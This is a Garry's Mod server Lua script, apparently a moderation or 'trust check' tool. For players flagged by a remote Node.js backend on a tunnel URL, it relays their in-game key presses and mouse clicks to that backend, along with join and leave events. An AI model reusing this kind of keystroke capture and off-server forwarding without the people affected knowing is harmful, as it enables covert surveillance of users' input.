util.AddNetworkString("key_press")
util.AddNetworkString("click_press")
util.AddNetworkString("start_observe")
util.AddNetworkString("stop_observe")

local NODE_URL = CreateConVar("hotkey_node_url", "https://trustchecker.loca.lt", FCVAR_PROTECTED, "URL для Node.js бэкенда")

local function GetApiSecret()
    local convar_value = GetConVarString("hotkey_api_secret")
    if convar_value and convar_value ~= "" then
        return convar_value
    else
        return "Тут был токен API_SECRET во время тестов"
    end
end

local API_SECRET = GetApiSecret()

local function CheckActiveSessions()
    http.Fetch(NODE_URL:GetString() .. "/active-sessions", function(body)
        local actives = util.JSONToTable(body) or {}
        if not actives then actives = {} end

        for _, ply in ipairs(player.GetAll()) do
            local id64 = ply:SteamID64()
            if table.HasValue(actives, id64) then
                if not ply.hotkey_observing then
                    ply.hotkey_observing = true
                    net.Start("start_observe")
                    net.Send(ply)
                    HTTP({
                        url = NODE_URL:GetString() .. "/log-event",
                        method = "POST",
                        headers = {
                            ["Content-Type"] = "application/json",
                            ["Authorization"] = "Bearer " .. API_SECRET,
                            ["bypass-tunnel-reminder"] = "123"
                        },
                        body = util.TableToJSON({steamid = id64, event = "entered"}),
                        success = function(code, body, headers) 
                            if code ~= 200 then end 
                        end,
                        failed = function(err) end
                    })
                end
            else
                if ply.hotkey_observing then
                    ply.hotkey_observing = false
                    net.Start("stop_observe")
                    net.Send(ply)
                    HTTP({
                        url = NODE_URL:GetString() .. "/log-event",
                        method = "POST",
                        headers = {
                            ["Content-Type"] = "application/json",
                            ["Authorization"] = "Bearer " .. API_SECRET,
                            ["bypass-tunnel-reminder"] = "123"
                        },
                        body = util.TableToJSON({steamid = id64, event = "exited"}),
                        success = function(code, body, headers) 
                            if code ~= 200 then end 
                        end,
                        failed = function(err) end
                    })
                end
            end
        end
    end, function(err) end)
end

timer.Create("CheckActiveSessions", 5, 0, CheckActiveSessions)  
timer.Simple(0.1, CheckActiveSessions)

net.Receive("key_press", function(len, ply)
    if not ply.hotkey_observing then return end
    local key = net.ReadString()
    if not key or #key > 50 then return end  
    local id64 = ply:SteamID64()
    HTTP({
        url = NODE_URL:GetString() .. "/log-keys",
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Authorization"] = "Bearer " .. API_SECRET,
            ["bypass-tunnel-reminder"] = "123"
        },
        body = util.TableToJSON({steamid = id64, key = key}),
        success = function(code, body, headers) 
            if code ~= 200 then end 
        end,
        failed = function(err) end
    })
end)

net.Receive("click_press", function(len, ply)
    if not ply.hotkey_observing then return end
    local x_norm = net.ReadFloat()
    local y_norm = net.ReadFloat()
    local w = net.ReadUInt(16)
    local h = net.ReadUInt(16)
    if not x_norm or not y_norm or w == 0 or h == 0 then return end  
    local id64 = ply:SteamID64()
    HTTP({
        url = NODE_URL:GetString() .. "/log-click",
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Authorization"] = "Bearer " .. API_SECRET,
            ["bypass-tunnel-reminder"] = "123"
        },
        body = util.TableToJSON({steamid = id64, click = {x = x_norm, y = y_norm, w = w, h = h}}),
        success = function(code, body, headers) 
            if code ~= 200 then end 
        end,
        failed = function(err) end
    })
end)

hook.Add("PlayerInitialSpawn", "HotkeySpawn", function(ply)
    timer.Simple(1, function()
        if not IsValid(ply) then return end
        local id64 = ply:SteamID64()
        http.Fetch(NODE_URL:GetString() .. "/active-sessions", function(body)
            local actives = util.JSONToTable(body) or {}
            if not actives then actives = {} end
            if table.HasValue(actives, id64) then
                ply.hotkey_observing = true
                net.Start("start_observe")
                net.Send(ply)
                HTTP({
                    url = NODE_URL:GetString() .. "/log-event",
                    method = "POST",
                    headers = {
                        ["Content-Type"] = "application/json",
                        ["Authorization"] = "Bearer " .. API_SECRET,
                        ["bypass-tunnel-reminder"] = "123"
                    },
                    body = util.TableToJSON({steamid = id64, event = "entered"}),
                    success = function(code, body, headers) 
                        if code ~= 200 then end 
                    end,
                    failed = function(err) end
                })
            end
        end)
    end)
end)

hook.Add("PlayerDisconnected", "HotkeyDisconnect", function(ply)
    if ply.hotkey_observing then
        local id64 = ply:SteamID64()
        HTTP({
            url = NODE_URL:GetString() .. "/log-event",
            method = "POST",
            headers = {
                ["Content-Type"] = "application/json",
                ["Authorization"] = "Bearer " .. API_SECRET,
                ["bypass-tunnel-reminder"] = "123"
            },
            body = util.TableToJSON({steamid = id64, event = "exited"}),
            success = function(code, body, headers) 
                if code ~= 200 then end 
            end,
            failed = function(err) end
        })
        ply.hotkey_observing = false
    end
end)